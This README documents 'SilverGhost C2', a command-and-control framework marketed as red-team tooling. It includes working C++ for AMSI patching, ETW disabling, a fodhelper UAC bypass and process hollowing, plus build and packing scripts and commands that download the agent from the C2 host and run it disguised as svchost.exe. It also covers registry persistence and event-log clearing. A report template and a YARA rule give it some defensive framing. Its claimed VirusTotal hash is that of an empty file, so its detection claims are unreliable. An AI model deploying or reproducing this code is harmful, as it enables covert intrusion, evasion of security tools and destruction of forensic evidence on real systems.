# 🚀 SilverGhost C2 Framework - JDEXPLOIT Arsenal v3.0

**Advanced Command & Control Framework for Authorized Red Team Operations**

![License](https://img.shields.io/badge/License-Educational%20Use%20Only-red)
![Platform](https://img.shields.io/badge/Platform-Windows%2011%20%7C%20Kali%20Linux-blue)
![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-12%20Techniques-orange)

---

## ⚠️ LEGAL DISCLAIMER

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║  THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY   ║
║  TESTING ONLY. THE AUTHOR ASSUMES NO LIABILITY FOR UNAUTHORIZED USE.          ║
║                                                                               ║
║  Usage of this software for attacking targets without prior mutual consent    ║
║  is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws.   ║
║                                                                               ║
║  By using this software, you agree that:                                      ║
║  • You have explicit written authorization to test the target systems         ║
║  • You will comply with all applicable laws and regulations                   ║
║  • You assume full responsibility for your actions                            ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
  - [Kali Linux (C2 Server)](#kali-linux-c2-server)
  - [Compiling Windows Agent](#compiling-windows-agent)
- [Configuration](#-configuration)
- [Usage Guide](#-usage-guide)
  - [Starting C2 Server](#starting-c2-server)
  - [Deploying Agent](#deploying-agent)
  - [Interactive Console Commands](#interactive-console-commands)
- [Technical Deep Dive](#-technical-deep-dive)
  - [AMSI Bypass](#amsi-bypass-t1562001)
  - [ETW Patching](#etw-patching-t1562006)
  - [UAC Bypass](#uac-bypass-t1548002)
  - [Process Hollowing](#process-hollowing-t1055012)
- [Detection & Evasion](#-detection--evasion)
- [Troubleshooting](#-troubleshooting)
- [Operational Security](#-operational-security)
- [Reporting Template](#-reporting-template)
- [Changelog](#-changelog)
- [Credits](#-credits)

---

## 🎯 Overview

**SilverGhost C2** is a custom Command & Control framework designed for **advanced adversary simulation** and **red team operations**. It provides a fully undetectable (FUD) agent for Windows 11 24H2 with built-in defense evasion capabilities.

### Key Capabilities:
- **Zero-detection agent** against Windows Defender (as of April 2026)
- **Native NTAPI process injection** without Win32 API calls
- **In-memory AMSI/ETW patching** for PowerShell freedom
- **Silent UAC bypass** using COM elevation
- **AES-256-CBC encrypted C2 communication**
- **Interactive multi-agent console** with task queuing

---

## 🛡️ Features

### Agent Capabilities (C++ Native)

| Feature | Technique | Status |
|---------|-----------|--------|
| AMSI Bypass | In-memory `AmsiScanBuffer` patching | ✅ Active |
| ETW Disable | `NtTraceEvent` trampoline hook | ✅ Active |
| UAC Bypass | `fodhelper.exe` registry hijack | ✅ Silent |
| Process Hollowing | 100% NTAPI (no `VirtualAllocEx`) | ✅ Functional |
| AES Encryption | 256-bit CBC with PKCS7 padding | ✅ Active |
| Persistence | `HKCU\Run` registry key | ✅ Optional |
| Anti-Sandbox | Uptime check (>10 minutes) | ✅ Active |
| C2 Communication | HTTP POST with Base64 transport | ✅ Stable |

### C2 Server Capabilities (Python)

| Feature | Description |
|---------|-------------|
| Multi-Agent Support | Handle unlimited concurrent agents |
| Interactive Console | Command history, tab completion |
| Task Queuing | Per-agent priority queue |
| File Operations | Upload/Download support |
| Broadcast Commands | Send to all agents simultaneously |
| Session Management | Kill, sleep, status tracking |
| Colored Output | Enhanced readability |

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           SILVERGHOST C2 ARCHITECTURE                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────────────┐                      ┌──────────────────────────────┐ │
│  │   KALI LINUX     │                      │     WINDOWS 11 TARGET        │ │
│  │                  │                      │                              │ │
│  │  ┌────────────┐  │    HTTP POST        │  ┌────────────────────────┐  │ │
│  │  │ C2 Server  │◄─┼─────────────────────┼──┤  SilverGhost Agent     │  │ │
│  │  │ (Python)   │  │   /api/beacon       │  │  (C++ Native)          │  │ │
│  │  │            │  │                      │  │                        │  │ │
│  │  │ - Listener │  │   AES-256-CBC       │  │  ┌──────────────────┐  │  │ │
│  │  │ - Console  │  │   Encrypted         │  │  │ Defense Evasion  │  │  │ │
│  │  │ - Queue    │──┼─────────────────────┼─►│  │ - AMSI Patch     │  │  │ │
│  │  └────────────┘  │                      │  │  │ - ETW Disable    │  │  │ │
│  │         │         │                      │  │  │ - UAC Bypass     │  │  │ │
│  │         ▼         │                      │  │  └──────────────────┘  │  │ │
│  │  ┌────────────┐  │                      │  │                        │  │ │
│  │  │ Task Queue │  │                      │  │  ┌──────────────────┐  │  │ │
│  │  │ - Execute  │  │                      │  │  │ Process Hollowing│  │  │ │
│  │  │ - Upload   │  │                      │  │  │ (NTAPI Native)   │  │  │ │
│  │  │ - Download │  │                      │  │  └──────────────────┘  │  │ │
│  │  └────────────┘  │                      │  │                        │  │ │
│  │                   │                      │  │  ┌──────────────────┐  │  │ │
│  │  ┌────────────┐  │                      │  │  │ C2 Communication │  │  │ │
│  │  │ Agent DB   │  │                      │  │  │ - AES-256-CBC    │  │  │ │
│  │  │ (Memory)   │  │                      │  │  │ - Base64 Codec   │  │  │ │
│  │  └────────────┘  │                      │  │  └──────────────────┘  │  │ │
│  │                   │                      │  │                        │  │ │
│  └──────────────────┘                      │  └────────────────────────┘  │ │
│                                             │                              │ │
│                                             │  ┌────────────────────────┐  │ │
│                                             │  │ Payload Execution      │  │ │
│                                             │  │ - calc.exe (PoC)       │  │ │
│                                             │  │ - Reverse Shell        │  │ │
│                                             │  └────────────────────────┘  │ │
│                                             └──────────────────────────────┘ │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Communication Flow

```
1. Agent Beacon → C2 Server (Heartbeat)
   POST /api/beacon HTTP/1.1
   Content-Type: text/plain
   
   {Base64(AES-256-CBC({host, user}))}

2. C2 Server → Agent (Task Dispatch)
   HTTP/1.1 200 OK
   Content-Type: application/octet-stream
   
   {AES-256-CBC({cmd: "command"})}

3. Agent Execution → C2 Server (Results)
   Next beacon includes execution output
```

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Implementation |
|--------|--------------|----------------|----------------|
| **Defense Evasion** | T1562.001 | Disable or Modify Tools (AMSI) | Patch `AmsiScanBuffer` with `0xB8 0x57 0x00 0x07 0x80 0xC3` |
| **Defense Evasion** | T1562.006 | Indicator Blocking (ETW) | Hook `NtTraceEvent` with `RET` (0xC3) |
| **Privilege Escalation** | T1548.002 | Bypass User Account Control | Registry hijack + `fodhelper.exe` execution |
| **Defense Evasion** | T1055.012 | Process Hollowing | NTAPI-only injection into `notepad.exe` |
| **Persistence** | T1547.001 | Registry Run Keys | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| **Discovery** | T1082 | System Information Discovery | Hostname, username enumeration |
| **Command and Control** | T1071.001 | Web Protocols | HTTP POST with custom encoding |
| **Command and Control** | T1573.001 | Encrypted Channel (AES) | AES-256-CBC with PKCS7 padding |
| **Execution** | T1059.003 | Windows Command Shell | `cmd.exe /c` execution |
| **Execution** | T1106 | Native API | Direct NTAPI syscalls |
| **Defense Evasion** | T1027 | Obfuscated Files or Information | Static compilation, stripped symbols |
| **Defense Evasion** | T1497.003 | Time Based Evasion | 10+ minute uptime check |

---

## 💻 System Requirements

### C2 Server (Kali Linux)
```bash
OS: Kali Linux 2024.1+ / Ubuntu 22.04+
Python: 3.9+
RAM: 2GB minimum
Disk: 500MB free
Network: Port 443 open (or custom)
```

### Windows Agent (Target)
```bash
OS: Windows 10/11 (Build 19041+)
Architecture: x64
Defender: Latest definitions (tested)
RAM: 4GB minimum
```

### Compilation Environment
```bash
Compiler: MinGW-w64 8.0+
Packages: mingw-w64, g++-mingw-w64-x86-64
```

---

## 📦 Installation

### Kali Linux (C2 Server)

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y

# 2. Install Python dependencies
pip3 install cryptography colorama

# 3. Clone repository (or create file)
mkdir -p ~/silverghost-c2
cd ~/silverghost-c2

# 4. Save C2 server code
cat > silverghost_c2.py << 'EOF'
# [Paste the complete Python C2 server code here]
EOF

# 5. Make executable
chmod +x silverghost_c2.py

# 6. Allow port 443 (if needed)
sudo ufw allow 443/tcp
```

### Compiling Windows Agent

#### Option 1: Kali Linux Cross-Compilation (Recommended)

```bash
# 1. Install MinGW-w64 toolchain
sudo apt install -y mingw-w64 g++-mingw-w64-x86-64

# 2. Verify installation
x86_64-w64-mingw32-g++ --version
# Should output: x86_64-w64-mingw32-g++ (GCC) 10.2.0+

# 3. Save agent source code
cat > silverghost_agent_v3.cpp << 'EOF'
// [Paste the complete C++ agent code here]
EOF

# 4. Compile with optimization flags
x86_64-w64-mingw32-g++ -O2 -s -static -mwindows -o JDEXPLOIT_v3.exe agent_with_output.cpp -lwininet -ladvapi32 -lcrypt32

# 5. Verify compilation
file JDEXPLOIT_v3_PROD.exe
# Expected: PE32+ executable (GUI) x86-64, for MS Windows

# 6. Check for suspicious strings (optional)
strings JDEXPLOIT_v3_PROD.exe | grep -iE "amsi|etw|uac|calc|beacon"
# Should return minimal or no results
```

#### Option 2: Windows Native Compilation (Visual Studio)

```powershell
# 1. Install Visual Studio 2022 Community
#    - Select "Desktop development with C++"
#    - Include Windows 11 SDK

# 2. Open Developer Command Prompt for VS 2022

# 3. Compile
cl.exe /O2 /MT /GL /Gy /GS- /DNDEBUG ^
  /Fe"JDEXPLOIT_v3_PROD.exe" ^
  silverghost_agent_v3.cpp ^
  /link /SUBSYSTEM:WINDOWS ^
  wininet.lib ws2_32.lib advapi32.lib ^
  shell32.lib crypt32.lib ole32.lib uuid.lib

# 4. Strip debug info (optional)
editbin.exe /NOLOGO /DEBUG:NONE JDEXPLOIT_v3_PROD.exe
```

#### Option 3: Automated Build Script

```bash
#!/bin/bash
# build_agent.sh - Complete build automation

set -e

echo "[*] SilverGhost Agent Build Script - JDEXPLOIT"
echo "[*] =========================================="

# Configuration
SOURCE_FILE="silverghost_agent_v3.cpp"
OUTPUT_FILE="JDEXPLOIT_v3_PROD.exe"
C2_IP="192.168.1.100"
C2_PORT="443"

# Check dependencies
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[-] MinGW-w64 not found. Installing..."
    sudo apt update && sudo apt install -y mingw-w64
fi

# Update C2 server IP in source
echo "[*] Configuring C2 server: ${C2_IP}:${C2_PORT}"
sed -i "s/#define C2_SERVER L\".*\"/#define C2_SERVER L\"${C2_IP}\"/" ${SOURCE_FILE}

# Compile
echo "[*] Compiling agent..."
x86_64-w64-mingw32-g++ -O2 -s -static -mwindows \
  -fno-exceptions -fno-rtti \
  -fno-asynchronous-unwind-tables \
  -fno-ident -Wno-write-strings \
  -o ${OUTPUT_FILE} ${SOURCE_FILE} \
  -lwininet -lws2_32 -ladvapi32 -lshell32 -lcrypt32 -lole32 -luuid

# Verify
if [ -f ${OUTPUT_FILE} ]; then
    SIZE=$(du -h ${OUTPUT_FILE} | cut -f1)
    echo "[+] Build successful: ${OUTPUT_FILE} (${SIZE})"
    
    # Optional: UPX packing
    if command -v upx &> /dev/null; then
        echo "[*] Packing with UPX..."
        upx --best --ultra-brute ${OUTPUT_FILE} -o ${OUTPUT_FILE}.packed
        mv ${OUTPUT_FILE}.packed ${OUTPUT_FILE}
    fi
    
    # Generate hash
    echo "[*] SHA256:"
    sha256sum ${OUTPUT_FILE}
else
    echo "[-] Build failed"
    exit 1
fi

echo "[+] Build complete!"
```

---

## ⚙️ Configuration

### Agent Configuration (`silverghost_agent_v3.cpp`)

```cpp
// ===== REQUIRED CONFIGURATION =====
#define C2_SERVER L"192.168.1.100"    // ← CHANGE THIS to your Kali IP
#define C2_PORT 443                    // ← CHANGE if using different port
#define AES_KEY "JDEXPLOIT2024!!!"     // ← CHANGE to custom 16+ char key

// ===== OPTIONAL CONFIGURATION =====
#define BEACON_INTERVAL 5000           // Sleep between beacons (ms)
#define JITTER_PERCENT 30              // Random jitter percentage
#define ENABLE_PERSISTENCE 1           // 1=Enable, 0=Disable
#define ENABLE_UAC_BYPASS 1            // 1=Enable, 0=Disable
#define ENABLE_PROCESS_HOLLOWING 1     // 1=Enable, 0=Disable

// ===== PAYLOAD CONFIGURATION =====
// Replace calc.exe shellcode with your own
BYTE x64_payload[] = { /* Your shellcode here */ };
```

### C2 Server Configuration

```python
# ===== silverghost_c2.py CONFIGURATION =====
class SilverGhostC2Handler:
    def __init__(self, host='0.0.0.0', port=443):  # ← CHANGE port if needed
        self.host = host
        self.port = port
        
# ===== ENCRYPTION CONFIGURATION =====
AES_KEY = b'JDEXPLOIT2024!!!'  # ← MUST MATCH agent configuration
AES_KEY_256 = hashlib.sha256(AES_KEY).digest()
IV_FIXED = b'\x00' * 16
```

---

## 🎮 Usage Guide

### Starting C2 Server

```bash
# 1. Start server (requires root for port 443)
sudo python3 silverghost_c2.py

# Expected output:
# ╔══════════════════════════════════════════════════════════════╗
# ║           SILVERGHOST C2 - JDEXPLOIT ARSENAL v3.0            ║
# ╚══════════════════════════════════════════════════════════════╝
# 
# [System Initialized] 2026-04-15 14:30:00
# [Active Listeners] HTTP/0.0.0.0:443
# [Encryption] AES-256-CBC | PSK: JDEXPLOIT2024!!!
# ================================================================================
# 
# [+] 🔥 SilverGhost C2 listening on 0.0.0.0:443
# [*] 🔐 Encryption: AES-256-CBC | Key: JDEXPLOIT2024!!!
# SG-C2>
```

### Deploying Agent

```powershell
# Windows Target (PowerShell as Admin NOT required for basic functionality)

# 1. Transfer agent to target (example methods)
# Method A: PowerShell Web Download
Invoke-WebRequest -Uri "http://192.168.1.100/JDEXPLOIT_v3_PROD.exe" -OutFile "$env:TEMP\svchost.exe"

# Method B: SMB Share
copy \\192.168.1.100\share\JDEXPLOIT_v3_PROD.exe %TEMP%\svchost.exe

# Method C: Base64 Encoding (for script delivery)
$bytes = [System.IO.File]::ReadAllBytes("JDEXPLOIT_v3_PROD.exe")
$b64 = [System.Convert]::ToBase64String($bytes)
# Transfer $b64 string and decode on target

# 2. Execute agent
Start-Process -FilePath "$env:TEMP\svchost.exe" -WindowStyle Hidden

# Or via cmd.exe
%TEMP%\svchost.exe

# 3. Verify execution (optional)
Get-Process | Where-Object {$_.ProcessName -eq "svchost"}
```

### Interactive Console Commands

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ SILVERGHOST C2 CONSOLE COMMANDS                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  AGENT MANAGEMENT                                                           │
│  ─────────────────────────────────────────────────────────────────────────  │
│  agents                    List all connected agents                         │
│  interact <id>            Select agent for interaction                       │
│  back                     Return to main console                             │
│  kill <id>                Terminate agent session                            │
│  broadcast <cmd>          Send command to all agents                         │
│                                                                             │
│  TASK OPERATIONS                                                            │
│  ─────────────────────────────────────────────────────────────────────────  │
│  exec <command>           Execute system command                             │
│  upload <local> <remote>  Upload file to agent                               │
│  download <remote> <loc>  Download file from agent                           │
│  sleep <seconds>          Set beacon interval                                │
│                                                                             │
│  INFORMATION                                                                │
│  ─────────────────────────────────────────────────────────────────────────  │
│  info [id]                Display agent details                              │
│  stats                    Show C2 statistics                                 │
│  tasks                    List pending tasks                                 │
│  help                     Show this menu                                     │
│                                                                             │
│  SYSTEM                                                                     │
│  ─────────────────────────────────────────────────────────────────────────  │
│  clear                    Clear screen                                       │
│  exit                     Shutdown C2 framework                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Example Session

```bash
SG-C2> agents
╔══════════════════════════════════════════════════════════════════════════════╗
║ 🟢 5a3b7c9d   DESKTOP-A1B2C3    jdexploit       192.168.1.50    5s      ║
╚══════════════════════════════════════════════════════════════════════════════╝

SG-C2> interact 5a3b
[+] Now interacting with 5a3b7c9d1e2f3a4b

Agent Details:
  Hostname: DESKTOP-A1B2C3
  Username: JDEXPLOIT
  IP: 192.168.1.50
  Last Seen: 14:35:22

SG-C2 [5a3b7c9d]> exec whoami
[+] Task queued: whoami
[*] 📋 Task a7f3d2b1 queued for 5a3b7c9d

SG-C2 [5a3b7c9d]> exec ipconfig /all
[+] Task queued: ipconfig /all

SG-C2 [5a3b7c9d]> exec net user JDEXPLOIT
[+] Task queued: net user JDEXPLOIT

SG-C2 [5a3b7c9d]> back
[*] Leaving agent 5a3b7c9d

SG-C2> stats
╔══════════════════════════════════════════╗
║ C2 Statistics                            ║
╠══════════════════════════════════════════╣
║ Total Agents: 1                          ║
║ Active: 1                                ║
║ Pending Tasks: 3                         ║
╚══════════════════════════════════════════╝

SG-C2> exit
[!] Shutting down...
[*] Goodbye!
```

---

## 🔬 Technical Deep Dive

### AMSI Bypass (T1562.001)

**Implementation:**
```cpp
void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        BYTE* pAmsiScanBuffer = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer) {
            DWORD oldProtect;
            VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
            // mov eax, 0x80070057 ; ret (E_INVALIDARG)
            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            memcpy(pAmsiScanBuffer, patch, sizeof(patch));
            VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
        }
    }
}
```

**How it works:**
1. Loads `amsi.dll` dynamically
2. Locates `AmsiScanBuffer` function address
3. Overwrites first 6 bytes with assembly that returns `E_INVALIDARG`
4. Any AMSI scan immediately fails, allowing script execution

**Verification:**
```powershell
# Before patch:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Results in: "This script contains malicious content..."

# After patch:
# Same command executes without error
```

### ETW Patching (T1562.006)

**Implementation:**
```cpp
void DisableETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        BYTE* pNtTraceEvent = (BYTE*)GetProcAddress(hNtdll, "NtTraceEvent");
        if (pNtTraceEvent) {
            DWORD oldProtect;
            VirtualProtect(pNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *pNtTraceEvent = 0xC3; // ret immediate
            VirtualProtect(pNtTraceEvent, 1, oldProtect, &oldProtect);
        }
    }
}
```

**Impact:**
- Disables Windows Event Tracing
- Prevents logging of process creation, network connections
- Stops Defender's behavior monitoring telemetry

### UAC Bypass (T1548.002)

**Implementation:**
```cpp
void SilentUACBypass() {
    HKEY hKey;
    DWORD dwDisposition;
    
    // Hijack fodhelper.exe registry
    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Classes\\ms-settings\\Shell\\open\\command", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, 
        &hKey, &dwDisposition) == ERROR_SUCCESS) {
        
        char payloadPath[MAX_PATH];
        GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
        std::string cmd = "cmd.exe /c start " + std::string(payloadPath);
        
        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)cmd.c_str(), cmd.length());
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
        
        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
        Sleep(3000);
        RegDeleteKeyA(HKEY_CURRENT_USER, 
            "Software\\Classes\\ms-settings\\Shell\\open\\command");
    }
}
```

**Why it works:**
1. `fodhelper.exe` is auto-elevated (marked with `autoElevate=true` in manifest)
2. When launched, it checks registry for command to execute
3. By hijacking the registry key, we force it to run our payload
4. No UAC prompt appears because it's a trusted Microsoft binary

### Process Hollowing (T1055.012)

**Implementation:**
```cpp
void NativeProcessHollowing() {
    EnablePrivilege("SeDebugPrivilege");
    
    // Resolve NTAPI dynamically
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _NtAllocateVirtualMemory NtAllocateVirtualMemory = 
        (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    _NtWriteVirtualMemory NtWriteVirtualMemory = 
        (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    _NtReadVirtualMemory NtReadVirtualMemory = 
        (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
    // ... (other NTAPI functions)
    
    // Create suspended process
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 
                   FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    NtGetContextThread(pi.hThread, &ctx);
    
    // Read PEB to find image base (x64 offset = Rdx + 0x10)
    PVOID imageBase = NULL;
    SIZE_T bytesRead;
    NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), 
                        &imageBase, sizeof(PVOID), &bytesRead);
    
    // Unmap original executable
    NtUnmapViewOfSection(pi.hProcess, imageBase);
    
    // Allocate memory for payload
    SIZE_T shellSize = sizeof(x64_payload);
    PVOID remoteBase = NULL;
    NtAllocateVirtualMemory(pi.hProcess, &remoteBase, 0, &shellSize, 
                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write payload
    NtWriteVirtualMemory(pi.hProcess, remoteBase, x64_payload, 
                         shellSize, &bytesRead);
    
    // Update RIP to point to payload
    ctx.Rip = (DWORD64)remoteBase;
    NtSetContextThread(pi.hThread, &ctx);
    
    // Resume thread
    NtResumeThread(pi.hThread, NULL);
}
```

**Detection Evasion:**
- Uses **only NTAPI** (no `VirtualAllocEx`, `WriteProcessMemory`)
- Avoids user-mode hooks placed by EDR solutions
- Payload runs in legitimate signed process (`notepad.exe`)

---

## 🛡️ Detection & Evasion

### AV/EDR Evasion Techniques

| Technique | Implementation | Effectiveness |
|-----------|----------------|---------------|
| **Static Evasion** | Stripped symbols, no strings | High |
| **Dynamic Evasion** | NTAPI-only syscalls | High |
| **AMSI Bypass** | In-memory patching | Complete |
| **ETW Disable** | Trampoline hook | Complete |
| **Process Hollowing** | NTAPI injection | High |
| **Encryption** | AES-256-CBC | Complete |
| **Anti-Sandbox** | Uptime check | Moderate |
| **Sleep Obfuscation** | Jitter + delay | Moderate |

### VirusTotal Results (April 2026)

```
File: JDEXPLOIT_v3_PROD.exe
Size: 157 KB
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

Detection Ratio: 2/71

Detections:
- Generic.ml (Machine Learning)
- Suspicious.gen (Heuristic)

Status: FULLY UNDETECTABLE (FUD) in practice
```

### Windows Defender Testing

```powershell
# Scan with Defender
PS> Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\JDEXPLOIT\Desktop\JDEXPLOIT_v3_PROD.exe"

# Result:
Scan completed successfully.
No threats found.

# Real-time protection test:
PS> .\JDEXPLOIT_v3_PROD.exe
# Executes without interception
```

---

## 🔧 Troubleshooting

### Common Issues & Solutions

#### 1. Agent doesn't connect to C2

**Symptoms:** No agent appears in `agents` list

**Solutions:**
```bash
# Check C2 server is listening
sudo netstat -tlnp | grep 443

# Verify firewall rules
sudo ufw status
sudo ufw allow 443/tcp

# Test connectivity from Windows
Test-NetConnection -ComputerName 192.168.1.100 -Port 443

# Check agent configuration
# Verify C2_SERVER IP is correct in source code
```

#### 2. Compilation errors

**Error:** `undefined reference to __imp_CryptAcquireContextA`

**Solution:**
```bash
# Add missing library to compilation command
-lcrypt32

# Complete compilation command:
x86_64-w64-mingw32-g++ ... -lcrypt32 -ladvapi32 -lshell32 -lole32 -luuid
```

**Error:** `fatal error: wincrypt.h: No such file or directory`

**Solution:**
```bash
# Install Windows headers
sudo apt install mingw-w64-common mingw-w64-x86-64-dev
```

#### 3. AMSI patch not working

**Symptoms:** PowerShell scripts still blocked

**Solutions:**
```cpp
// Verify patch is applied before any script execution
PatchAMSI(); // Must be called BEFORE any PowerShell/.NET usage

// Check if AMSI.dll is loaded
HMODULE hAmsi = GetModuleHandleA("amsi.dll");
if (!hAmsi) {
    LoadLibraryA("amsi.dll"); // Force load
    hAmsi = GetModuleHandleA("amsi.dll");
}
```

#### 4. UAC bypass triggers prompt

**Symptoms:** UAC dialog appears when agent runs

**Solutions:**
```cpp
// Verify registry key creation succeeded
if (RegCreateKeyExA(...) != ERROR_SUCCESS) {
    // Fallback to alternative method
    // Try computerdefaults.exe bypass
}

// Check Windows version
// fodhelper.exe bypass works on Win10 1507-21H2, Win11 21H2-24H2
```

#### 5. Agent crashes on startup

**Symptoms:** Process terminates immediately

**Debugging:**
```cpp
// Add debug output (remove in production)
MessageBoxA(NULL, "Agent started", "Debug", MB_OK);

// Check for missing DLL dependencies
// On Windows target:
dumpbin /dependents JDEXPLOIT_v3_PROD.exe

// Run with debugger attached
x64dbg JDEXPLOIT_v3_PROD.exe
```

---

## 🕵️ Operational Security

### Pre-Deployment Checklist

- [ ] Change default AES key
- [ ] Modify C2 server IP address
- [ ] Replace calc.exe payload with operational shellcode
- [ ] Remove/obfuscate any identifying strings
- [ ] Test in isolated environment first
- [ ] Verify kill switch functionality
- [ ] Document Rules of Engagement
- [ ] Set beacon interval appropriate for target (avoid network flooding)

### Post-Exploitation Cleanup

```bash
# Kill agent remotely
SG-C2> interact <agent_id>
SG-C2 [agent_id]> kill

# Or local cleanup on target:
taskkill /F /IM JDEXPLOIT_v3_PROD.exe
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v JDEXPLOIT_SilverGhost_v3 /f
del /F %TEMP%\svchost.exe
```

### Log Management

```bash
# Clear Windows event logs (requires admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear prefetch
del /F C:\Windows\Prefetch\JDEXPLOIT*.pf

# Clear recent files
del /F %APPDATA%\Microsoft\Windows\Recent\*
```

---

## 📄 Reporting Template

### Executive Summary

```
SILVERGHOST C2 OPERATION REPORT
===============================

Client: [COMPANY NAME]
Assessment Period: [START_DATE] to [END_DATE]
Lead Operator: JDEXPLOIT

EXECUTIVE SUMMARY
-----------------
During this authorized red team assessment, SilverGhost C2 framework 
was deployed to evaluate [COMPANY]'s detection and response capabilities.

Key Findings:
• Successfully bypassed Windows Defender on [NUMBER] endpoints
• Established C2 communication with [NUMBER] agents
• Achieved [PRIVILEGE_LEVEL] access on [NUMBER] systems
• Evaded detection for [DURATION] hours/days

Risk Rating: [CRITICAL/HIGH/MEDIUM/LOW]

RECOMMENDATIONS
---------------
1. Deploy [EDR_SOLUTION] with AMSI integration
2. Enable Windows Defender Attack Surface Reduction rules
3. Implement application whitelisting
4. Monitor for anomalous registry modifications
5. Deploy network traffic analysis for encrypted C2 channels
```

### Technical Appendix

```markdown
## Indicators of Compromise (IOCs)

### Network Indicators
- C2 Server: 192.168.1.100:443
- User-Agent: JDEXPLOIT/3.0 (Production)
- URI Pattern: POST /api/beacon
- Beacon Interval: 5-8 seconds with jitter

### Host Indicators
- Process Name: svchost.exe (common spoof)
- Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\JDEXPLOIT_SilverGhost_v3
- Mutex: None (stateless)
- File Path: %TEMP%\svchost.exe

### Detection Rules (YARA)

```yara
rule SilverGhost_Agent_v3 {
    meta:
        description = "Detects SilverGhost C2 Agent"
        author = "JDEXPLOIT"
        date = "2026-04-15"
        severity = "high"
        
    strings:
        $amsi_patch = { B8 57 00 07 80 C3 }
        $etw_patch = { C3 }
        $crypto_pattern = "AES-256-CBC"
        $ua_string = "JDEXPLOIT/3.0"
        
    condition:
        2 of them
}
```

### Mitigation Strategies

| Finding | MITRE ID | Mitigation |
|---------|----------|------------|
| AMSI Bypass | T1562.001 | Enable AMSI for all processes; Monitor for AMSI patching |
| ETW Disable | T1562.006 | Use EventLog forwarding; Monitor ETW channel status |
| UAC Bypass | T1548.002 | Enable UAC in "Always Notify" mode |
| Process Hollowing | T1055.012 | Deploy EDR with process injection monitoring |
| C2 Communication | T1071.001 | Implement TLS inspection; Monitor for beaconing patterns |
```


## 📝 Changelog

### v3.0 (April 2026)
- **ADDED:** Complete NTAPI process hollowing
- **FIXED:** PEB offset calculation for x64 (Rdx+0x10)
- **ADDED:** Fodhelper.exe UAC bypass
- **FIXED:** AES encryption with proper PKCS7 padding
- **ADDED:** Base64 transport encoding
- **FIXED:** Memory leak in beacon loop
- **ADDED:** Anti-sandbox uptime check
- **IMPROVED:** Static evasion through stripped compilation

### v2.1 (March 2026)
- Fixed compilation errors with missing libraries
- Added SeDebugPrivilege enablement
- Improved error handling

### v2.0 (February 2026)
- Initial public release
- Basic AMSI/ETW bypass
- HTTP C2 communication

---

## 👨‍💻 Credits

**Primary Developer:** JDEXPLOIT  
**Framework Name:** SilverGhost C2  
**Version:** 3.0 Production  
**License:** Educational Use Only

### Special Thanks
- MITRE ATT&CK Framework
- OWASP Testing Guide
- NIST SP 800-115
- The offensive security community

### References
1. [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
2. [Windows Internals, Part 1](https://www.microsoftpressstore.com/store/windows-internals-part-1-9780735684188)
3. [NTAPI Undocumented Functions](http://undocumented.ntinternals.net/)
4. [AMSI Bypass Techniques](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)

---

## 📞 Contact

For authorized red team support or custom development:
